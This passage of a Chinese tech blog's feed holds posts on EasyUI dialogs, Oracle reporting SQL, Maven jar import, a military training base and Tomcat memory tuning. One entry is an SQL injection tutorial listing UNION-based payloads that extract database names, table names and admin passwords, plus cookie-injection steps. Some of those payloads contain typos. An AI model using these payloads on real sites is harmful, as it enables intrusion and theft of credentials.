&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;confirm方法-确认框-如果点击确定，r的值为true&quot;&gt;&lt;a href=&quot;#confirm方法-确认框-如果点击确定，r的值为true&quot; class=&quot;headerlink&quot; title=&quot;confirm方法,确认框,如果点击确定，r的值为true&quot;&gt;&lt;/a&gt;confirm方法,确认框,如果点击确定，r的值为true&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$.messager.confirm(&amp;quot;提示信息&amp;quot;,&amp;quot;你确定删除当前数据吗？&amp;quot;,function(r){
                        alert(r);
                    });
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;prompt方法，跟confirm的作用差不多&quot;&gt;&lt;a href=&quot;#prompt方法，跟confirm的作用差不多&quot; class=&quot;headerlink&quot; title=&quot;prompt方法，跟confirm的作用差不多&quot;&gt;&lt;/a&gt;prompt方法，跟confirm的作用差不多&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$.messager.prompt(&amp;quot;提示信息&amp;quot;,&amp;quot;你确定删除当前数据吗？&amp;quot;,function(r){
                                    alert(r);
                                });
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;progress方法，进度条&quot;&gt;&lt;a href=&quot;#progress方法，进度条&quot; class=&quot;headerlink&quot; title=&quot;progress方法，进度条&quot;&gt;&lt;/a&gt;progress方法，进度条&lt;/h2&gt;&lt;p&gt;//打开进度条&lt;br&gt;$.messager.progress();&lt;br&gt;//关闭进度条&lt;br&gt;$.messager.progress(‘close’);&lt;br&gt;
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="项目" scheme="http://burinicc.cn/tags/%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>复杂的sql</title>
    <link href="http://burinicc.cn/2016/12/01/%E5%A4%8D%E6%9D%82%E7%9A%84sql/"/>
    <id>http://burinicc.cn/2016/12/01/复杂的sql/</id>
    <published>2016-12-01T12:39:19.000Z</published>
    <updated>2016-12-08T12:24:19.803Z</updated>
    
    <content type="html"><![CDATA[<p>做统计分析时，统计每个地区医院的采购金额</p>
<pre>
select areainfo.areaname,nvl(business.cgje,0)cgje from
(select areaname from bss_sys_area where arealevel='2')areainfo left join(
select sum(nvl(cgje,0))cgje,
       parentid,
       (select areaname from bss_sys_area where business.parentid=areaid)areaname from (
select dq,cgje,
       (select parentid from bss_sys_area where dq=areaid)parentid
from (
select useryyid,
       (select dq from useryy where useryyid=useryy.id)dq,
       cgje
from (
select useryy.id      useryyid,
       useryy.mc      useryymc,
       yycgd.bm       yycgdbm,
       yycgd.id       yycgdid,
       usergys.id     usergysid,
       usergys.mc     usergysmc,
       yycgdmx.ypxxid,
       ypxx.id,
       ypxx.bm,
       ypxx.mc,
       ypxx.jx,
       ypxx.gg,
       ypxx.zhxs,
       ypxx.scqymc,
       ypxx.spmc,

       ypxx.jyzt,

       (select info
          from dictinfo
         where ypxx.jyzt = dictcode
           and typecode = '003') jyztmc,
       (select info
          from dictinfo
         where typecode = '011'
           and dictcode = yycgdmx.cgzt) cgztmc,
       yycgdmx.cgl,
       yycgdmx.cgje,
       yycgdmx.rkl,
       yycgdmx.rkje,
       yycgdmx.thl,
       yycgdmx.thje,
       yycgdmx.jsl,
       yycgdmx.jsje

  from yybusiness2016 yycgdmx, yycgd2016 yycgd, useryy, usergys, ypxx
 where yycgdmx.yycgdid = yycgd.id
   and yycgd.useryyid = useryy.id
   and yycgdmx.usergysid = usergys.id
   and yycgdmx.ypxxid = ypxx.id)business)business)business group by parentid)business
on business.areaname=areainfo.areaname</pre>

<p>   下面的sql让我对外连接和内连接以及它们使用的时机有了一个更清楚认识，表的关联需要注意的事项就是一定要保证我们主表在所关联的表只能查到一条记录，这个字段要么不是外键要么就是多个字段构成关联表的唯一约束</p>
   <pre>select yycgdmx.*,yycgdrk.rkl,
       yycgdrk.rkje
        from(
      select
        useryy.mc useryymc,
        yycgd.bm yycgdbm,
        yycgdmx.yycgdid,
        yycgdmx.ypxxid,
        usergys.mc usergysmc,
        yycgdmx.cgl,
        yycgdmx.cgje,
        ypxx.*
        from yycgdmx2016 yycgdmx,
             yycgd2016 yycgd,
             useryy,
             usergys,
             ypxx
             where yycgdmx.yycgdid=yycgd.id
             and yycgd.useryyid=useryy.id
             and yycgdmx.ypxxid=ypxx.id
             and yycgdmx.usergysid=usergys.id

      )yycgdmx
      （注释)外连接查询入库信息表
       left join yycgdrk2016 yycgdrk
      on yycgdmx.yycgdid=yycgdrk.yycgdid
      and yycgdmx.ypxxid=yycgdrk.ypxxid</pre>


<p>总结：在数据库设计时，为了保证数据的完整性，不能把入库量、结算量、退货量、结算金额等重要的业务数据放在yycgdmx中，因为这些信息在创建明细表中根本就不存在，然而这些数据对应的字段不能为空，所以就产生了矛盾。故还应该设计另外一张表来存放这些业务信息yybusiness，考虑到表的数据量也会很大，就写了一个创建表的储存过程，由系统的定时任务来调用。yybusiness中的数据插入时机是监督单位审核后，因为有业务逻辑的判断，使用触发器来插入数据比较复杂，相比较在业务层做这个工作比较方便。当更新yybusiness中的信息的时候，这时触发器会帮助把数据放到自己业务所对应的表中，比如结算流程，对应的yyjsd表。这里使用触发器还帮着实现了数据同步，另外，这样做实际上就是数据聚合。前段时间，一个同学问我数据聚合，当时把我问的一头雾水，现在想想还觉的脸红。其实，它就是为了我们方便操作数据，这里的操作主要是查询，你想想看，数据结构中，数组为什么比链表好查。其实是一个道理。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做统计分析时，统计每个地区医院的采购金额&lt;/p&gt;
&lt;pre&gt;
select areainfo.areaname,nvl(business.cgje,0)cgje from
(select areaname from bss_sys_area where arealevel=
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="sql" scheme="http://burinicc.cn/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>向maven私服中导入jar包</title>
    <link href="http://burinicc.cn/2016/12/01/%E5%90%91maven%E7%A7%81%E6%9C%8D%E4%B8%AD%E5%AF%BC%E5%85%A5jar%E5%8C%85/"/>
    <id>http://burinicc.cn/2016/12/01/向maven私服中导入jar包/</id>
    <published>2016-12-01T11:55:41.000Z</published>
    <updated>2016-12-08T12:24:41.860Z</updated>
    
    <content type="html"><![CDATA[<p>对于官网没有的jar包，maven向本地仓库导入jar包用如下命令<br>Java代码<br>mvn install:install-file<br>-DgroupId=包名<br>-DartifactId=项目名<br>-Dversion=版本号<br>-Dpackaging=jar<br>-Dfile=jar文件所在路径<br>以pinyin4j-2.5.0为例：<br>1、将pinyin4j-2.5.0.jar文件放在“D:\”目录下（该目录任意）<br>2、执行命令：<br>mvn install:install-file  -Dfile=D:\pinyin4j-2.5.0.jar -DgroupId=net.sourceforge.pinyin4j -DartifactId=pinyin4j -Dversion=2.5.0 -Dpackaging=jar  -DgeneratePom=true -DcreateChecksum=true<br>这样maven向本地仓库导入 pinyin4j-2.5.0.jar 包就成功了。<br>3.pom.xml文件配置：<br>Xml代码   </p>
<pre>&ltdependency&gt
      &ltgroupId&gtnet.sourceforge&lt/groupId&gt
      &ltartifactId&gtpinyin4j&lt/artifactId&gt
      &ltversion&gt2.5.0&lt/version&gt
   &lt/dependency&gt</pre>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于官网没有的jar包，maven向本地仓库导入jar包用如下命令&lt;br&gt;Java代码&lt;br&gt;mvn install:install-file&lt;br&gt;-DgroupId=包名&lt;br&gt;-DartifactId=项目名&lt;br&gt;-Dversion=版本号&lt;br&gt;-Dpackagi
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="maven" scheme="http://burinicc.cn/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>神秘的“朱日和”</title>
    <link href="http://burinicc.cn/2016/12/01/%E6%9C%B1%E6%97%A5%E5%92%8C%E4%BB%8B%E7%BB%8D/"/>
    <id>http://burinicc.cn/2016/12/01/朱日和介绍/</id>
    <published>2016-12-01T10:04:37.000Z</published>
    <updated>2016-12-08T12:25:40.608Z</updated>
    
    <content type="html"><![CDATA[<img src="/images/zrh.png" width="380" height="480">
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三界：全军首个训练基地 、朱日和：科技含量最高、确山：唯一特种作战训练场。确山曾经去过两次，规模宏达，很征服人心。所以对三界和朱日和这两大军事训练基地充满了无限的向往。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;朱日和训练基地势必是今年最吸引外界目光的军事训练场地。从6月份到9月份，连续举行了三场声势浩大的实兵演习。最先是持续两个月、用兵数万人的“跨越-2014·朱日和”实兵对抗系列演习，然后是8月末“和平使命—2014”上海合作组织成员国武装力量联合反恐实兵演习，最近的是首次信息化条件下实兵对抗卫勤保障演习“卫勤使命—2014”。　朱日和训练基地隶属北京军区，距离北京数百公里，位于内蒙古草原的锡林郭勒盟。其前身是某装甲兵训练场。据《解放军报》报道，1999年7月，为适应未来高技术战争的需要，中央军委决定将该训练场扩编成全军规模最大、科技含量最高、现代化程度最高的合同战术训练基地。2011年军委、总部决定将朱日和训练基地建成全军唯一陆军联合作战实验场。国防部网站的一篇文章将朱日和基地描绘为“全亚洲最大、解放军最先进的训练基地，也被称为‘中国欧文堡’”。朱日和训练基地由沙漠、草原、山地、壕沟等组成，占地1,066平方公里，与香港面积差不多。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7月15日起，代号为“跨越-2016·朱日和”的陆军跨战区实兵检验性对抗演习，在位于内蒙古的朱日和训练基地展开。来自5个战区陆军的5支陆军合成旅将参加今年的演习，7月至9月底，他们会与我军首支陆军专业化模拟蓝军部队展开实兵对抗。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7月19日，红军坦克在对坚固目标实施打击。当日，“跨越－2016·朱日和Ａ”演习开始进入实兵对抗阵地进攻战。“朱日和”系列演习是我军年度性的重大演习，对于检验战备状况，研究未来战争模式，解放军军改方向等都指导意义，堪称“年度大考”。据报道，今年的演习将改为“蓝军”进攻， “红军”防守的新模式。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看得出，这是一处绝佳的战场。的确，整整800年前，成吉思汗的铁骑由此扬鞭远征，横扫亚欧；300多年前，康熙皇帝御驾亲征，经此征讨准噶尔叛军。如今，这片广袤的古战场崛起为一座现代化的军事训练基地。</p>
]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;/images/zrh.png&quot; width=&quot;380&quot; height=&quot;480&quot;&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;三界：全军首个训练基地 、朱日和：科技含量最高、确山：唯一特
    
    </summary>
    
      <category term="military" scheme="http://burinicc.cn/categories/military/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入问题详解</title>
    <link href="http://burinicc.cn/2016/12/01/sql%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://burinicc.cn/2016/12/01/sql注入问题详解/</id>
    <published>2016-12-01T03:23:39.000Z</published>
    <updated>2016-12-08T12:26:49.298Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
<pre><code>http://example.asp?id=49
http://example.asp?id=49 and 1=1
http://example.asp?id=49 and 1=2
</code></pre><p>可以注入的表现：</p>
<pre><code>正常显示
正常显示
提示BOF或EOF
</code></pre><p>不可注入的表现：</p>
<pre><code>正常显示
程序定义的错误提示或提示类型转换时出错。
同上
</code></pre><p>2.判断数据库类型<br>加单引号</p>
<pre><code>错误提示含有JET（JET是ACCESS数据库的数据库引擎）
错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
</code></pre><p>and user &gt; 0</p>
<p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p>
<p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。<br>and (select count (*) from sysobjects) &gt; 0</p>
<p>SQL SERVER显示正常。ACCESS显示出错。<br>and (select count (*) from msysobjects) &gt; 0</p>
<p>SQL SERVER显示正常。ACCESS显示没有权限。<br>3.猜表名</p>
<p>and (select count (*) from admin) &gt;= 0<br>返回正常说明admin存在<br>4.猜字段</p>
<p>and (select count (content) from admin) &gt;= 0<br>返回正常说明content字段存在</p>
<p>常用的猜字段函数<br>ACCESS: asc(字符) 返回字符的ascii<br>MSSQL: unicode(字符) 同上<br>ACCESS: char(数字) 返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L) 同上<br>ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C 判断A是否在B和C之间</p>
<p>例and (select asc(mind(password,1,1))from admin) &gt; 100<br>查询admin中password字段第1个字符串的ascii是否大于100</p>
<p>例select <em> from article where articleid = ‘’ union select </em> from user where userid = 1<br>第一个select执行后返回结果title content<br>select <em> from article where articleid = ‘’<br>第二个select执行后返回结果username password<br>select </em> from user where userid = 1<br>整个select执行后返回结果username password<br>如果前面查询为真，则同时返回两次查询的内容</p>
<pre><code>判断字段个数order by
查表名and (select count (*) from admin) &gt;= 0
猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
</code></pre><p>inner join on: 指定返回两个表中匹配的行<br>select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容</p>
<p>上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</p>
<p>select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容<br>MSSQL</p>
<pre><code>判断字段个数order by 13
判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
</code></pre><p>ASSESS<br><a id="more"></a><br>    试探1=1 1=2<br>    环境监测and ord(mid(version(),1,1))&gt;51正常则为mysql4以上版本，可以union查询union select 1,version(),3<br>    确定字段数order by 13<br>    判断精确字段and 1=2 union select 1,2,3,4正常返回在页面中<br>    爆数据库名and 1=2 union select 1,user(),3,database()正常返回在页面中<br>    爆表and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = ‘blah’结果返回在2字段<br>    爆字段and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=’users’ and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=’users’<br>    爆数据and 1=2 union select 1,user,3,password form phptest.users</p>
<p>cookie注入</p>
<pre><code>在原地址加单引号
去掉id值，页面出错，构造cookie语句：javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=1&quot;))会弹窗
关闭弹窗，去掉id访问，页面正常
猜测字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 order by 5&quot;))点击确认，去掉id访问，页面正常则正常
判断回显位javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,2,3,4 from admin&quot;))点击确认，去掉id访问，页面正常则正常
猜解user password字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,user,3,4 from admin&quot;))
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。&lt;br&gt;SQL注入基础&lt;br&gt;1.试探 1=1，1=2&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://example.asp?id=49
http://example.asp?id=49 and 1=1
http://example.asp?id=49 and 1=2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以注入的表现：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;正常显示
正常显示
提示BOF或EOF
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不可注入的表现：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;正常显示
程序定义的错误提示或提示类型转换时出错。
同上
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.判断数据库类型&lt;br&gt;加单引号&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;错误提示含有JET（JET是ACCESS数据库的数据库引擎）
错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and user &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。&lt;/p&gt;
&lt;p&gt;ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。&lt;br&gt;and (select count (*) from sysobjects) &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER显示正常。ACCESS显示出错。&lt;br&gt;and (select count (*) from msysobjects) &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER显示正常。ACCESS显示没有权限。&lt;br&gt;3.猜表名&lt;/p&gt;
&lt;p&gt;and (select count (*) from admin) &amp;gt;= 0&lt;br&gt;返回正常说明admin存在&lt;br&gt;4.猜字段&lt;/p&gt;
&lt;p&gt;and (select count (content) from admin) &amp;gt;= 0&lt;br&gt;返回正常说明content字段存在&lt;/p&gt;
&lt;p&gt;常用的猜字段函数&lt;br&gt;ACCESS: asc(字符) 返回字符的ascii&lt;br&gt;MSSQL: unicode(字符) 同上&lt;br&gt;ACCESS: char(数字) 返回ascii的字符&lt;br&gt;MSSQL: nchar()同上&lt;br&gt;ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串&lt;br&gt;MSSQL: substring(字符串,N,L) 同上&lt;br&gt;ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）&lt;br&gt;ACCESS,MSSQL: A between B and C 判断A是否在B和C之间&lt;/p&gt;
&lt;p&gt;例and (select asc(mind(password,1,1))from admin) &amp;gt; 100&lt;br&gt;查询admin中password字段第1个字符串的ascii是否大于100&lt;/p&gt;
&lt;p&gt;例select &lt;em&gt; from article where articleid = ‘’ union select &lt;/em&gt; from user where userid = 1&lt;br&gt;第一个select执行后返回结果title content&lt;br&gt;select &lt;em&gt; from article where articleid = ‘’&lt;br&gt;第二个select执行后返回结果username password&lt;br&gt;select &lt;/em&gt; from user where userid = 1&lt;br&gt;整个select执行后返回结果username password&lt;br&gt;如果前面查询为真，则同时返回两次查询的内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;判断字段个数order by
查表名and (select count (*) from admin) &amp;gt;= 0
猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;inner join on: 指定返回两个表中匹配的行&lt;br&gt;select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容&lt;/p&gt;
&lt;p&gt;上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id&lt;/p&gt;
&lt;p&gt;select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容&lt;br&gt;MSSQL&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;判断字段个数order by 13
判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ASSESS&lt;br&gt;
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="SQL注入" scheme="http://burinicc.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>tomcat 内存溢出三种解决方式</title>
    <link href="http://burinicc.cn/2016/12/01/tomcat-%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E4%B8%89%E7%A7%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <id>http://burinicc.cn/2016/12/01/tomcat-内存溢出三种解决方式/</id>
    <published>2016-12-01T03:04:33.000Z</published>
    <updated>2016-12-08T12:27:00.017Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcat内存溢出的原因<br>　　在生产环境中tomcat内存设置不好很容易出现内存溢出。造成内存溢出是不一样的，当然处理方式也不一样。<br>　　这里根据平时遇到的情况和相关资料进行一个总结。常见的一般会有下面三种情况：<br>　　1.OutOfMemoryError： Java heap space<br>　　2.OutOfMemoryError： PermGen space<br>　　3.OutOfMemoryError： unable to create new native thread.<br>　　Tomcat内存溢出解决方案<br>　　对于前两种情况，在应用本身没有内存泄露的情况下可以用设置tomcat jvm参数来解决。（-Xms -Xmx -XX：PermSize -XX：MaxPermSize）<br>　　最后一种可能需要调整操作系统和tomcat jvm参数同时调整才能达到目的。<br>　　第一种：是堆溢出。<br>　　原因分析：<br>JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。<br>在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息。<br>Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。<br>　　没有内存泄露的情况下，调整-Xms -Xmx参数可以解决。<br>　　-Xms：初始堆大小<br>　　-Xmx：最大堆大小<br>　　但堆的大小受下面三方面影响：<br>　　1.相关操作系统的数据模型（32-bt还是64-bit）限制；（32位系统下，一般限制在1.5G~2G；我在2003 server 系统下（物理内存：4G和6G，jdk：1.6）测试 1612M，64位操作系统对内存无限制。）<br>　　2.系统的可用虚拟内存限制；<br>　　3.系统的可用物理内存限制。<br>　　堆的大小可以使用 java -Xmx<em>*</em>M version 命令来测试。支持的话会出现jdk的版本号，不支持会报错。<br>　　-Xms -Xmx一般配置成一样比较好比如set JAVA_OPTS= -Xms1024m -Xmx1024m<br>其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可<br>进行设置<br>实例，以下给出1G内存环境下java jvm 的参数设置参考：<br>JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “<br>JAVA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:<br>NewSize=192m -XX:MaxNewSize=384m”<br>CATALINA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m<br>-XX:NewSize=192m -XX:MaxNewSize=384m”<br>服务器为1G内存：JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “<br>服务器为64位、2G内存: JAVA_OPTS=’-server -Xms1024m -Xmx1536m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m’<br>——————-解决方案1：—————————–<br>前提：是执行startup.bat启动tomcat的方式<br>Linux服务器：<br>在/usr/local/apache-tomcat-5.5.23/bin 目录下的catalina.sh<br>添加：JAVA_OPTS=’-Xms512m -Xmx1024m’<br>或者 JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:MaxNewSize=256m”<br>或者 CATALINA_OPTS=”-server -Xms256m -Xmx300m”<br>Windows服务器：<br>在catalina.bat最前面加入<br>set JAVA_OPTS=-Xms128m -Xmx350m<br>或者set CATALINA_OPTS=-Xmx300M -Xms256M<br>（区别是一个直接设置jvm内存，另一个设置tomcat内存，CATALINA_OPTS似乎可以与JAVA_OPTS不加区别的使用）<br>基本参数说明<br>-client，-server<br>这两个参数用于设置虚拟机使用何种运行模式，一定要作为第一个参数，client模式启动比较快，但运行时性能和内存管理效率不如server模式，通常用于客户端应用程序。相反，server模式启动比client慢，但可获得更高的运行性能。<br>在windows上，缺省的虚拟机类型为client模式，如果要使用server模式，就需要在启动虚拟机时加-server参数，以获得更高性能，对服务器端应用，推荐采用server模式，尤其是多个CPU的系统。在Linux，Solaris上缺省采用server模式。<br>此外，在多cup下，建议用server模式<br>-Xms<size><br>设置虚拟机可用内存堆的初始大小，缺省单位为字节，该大小为1024的整数倍并且要大于1MB，可用k(K)或m(M)为单位来设置较大的内存数。初始堆大小为2MB。加“m”说明是MB，否则就是KB了。<br>例如：-Xms6400K，-Xms256M<br>-Xmx<size><br>设置虚拟机的最大可用大小，缺省单位为字节。该值必须为1024整数倍，并且要大于2MB。可用k(K)或m(M)为单位来设置较大的内存数。缺省堆最大值为64MB。<br>例如：-Xmx81920K，-Xmx80M<br>当应用程序申请了大内存运行时虚拟机抛出java.lang.OutOfMemoryError: Java heap space错误，就需要使用-Xmx设置较大的可用内存堆。<br>PermSize/MaxPermSize：定义Perm段的尺寸，即永久保存区域的大小，PermSize为JVM启动时初始化Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>如果用startup.bat启动tomcat,OK设置生效.够成功的分配200M内存.<br>——————-解决方案2：————————<br>前提：是执行startup.bat启动tomcat的方式<br>手动设置Heap size<br>Windows服务器：<br>修改TOMCAT_HOME/bin/catalina.bat，在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>Java代码<br>set JAVA_OPTS=%JAVA_OPTS% -server -Xms800m -Xmx800m -XX:MaxNewSize=256m<br><a id="more"></a><br>注：JAVA_OPTS是保留先前设置。<br>Linux服务器：<br>修改TOMCAT_HOME/bin/catalina.sh<br>在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>JAVA_OPTS=”$JAVA_OPTS -server -Xms800m -Xmx800m -XX:MaxNewSize=256m”<br>注：$JAVA_OPTS是保留先前设置。<br>——————-解决方案3：—————————–<br>前提：是执行windows的系统服务启动tomcat的方式<br>但是如果不是执行startup.bat启动tomcat而是利用windows的系统服务启动tomcat服务,上面的设置就不生效了,<br>就是说set JAVA_OPTS=-Xms128m -Xmx350m 没起作用.上面分配200M内存就OOM了..<br>windows服务执行的是bin\tomcat.exe.他读取注册表中的值,而不是catalina.bat的设置.<br>解决办法:<br>修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Apache Software Foundation\Tomcat Service Manager\Tomcat5\Parameters\JavaOptions<br>原值为<br>-Dcatalina.home=”C:\ApacheGroup\Tomcat 5.0”<br>-Djava.endorsed.dirs=”C:\ApacheGroup\Tomcat 5.0\common\endorsed”<br>-Xrs<br>加入 -Xms300m -Xmx350m<br>重起tomcat服务,设置生效<br>——————-解决方案4：—————————–<br>前提：是执行windows的系统服务启动tomcat的方式<br>在安装tomcat时若有勾选”NT Service(NT/2000/XP 